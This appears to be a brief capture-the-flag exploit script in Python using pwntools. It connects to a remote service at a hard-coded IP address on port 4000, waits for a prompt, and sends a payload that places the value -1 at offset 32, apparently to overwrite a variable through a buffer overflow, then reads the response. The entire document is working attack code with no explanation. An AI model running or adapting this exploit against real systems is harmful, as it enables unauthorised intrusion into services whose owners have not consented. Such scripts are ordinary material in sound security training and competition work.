from pwn import *

io = remote('20.169.252.240', 4000)
io.recvuntil('him:')
payload = fit({
    32: -1,
})
io.sendline(payload)
io.recvall()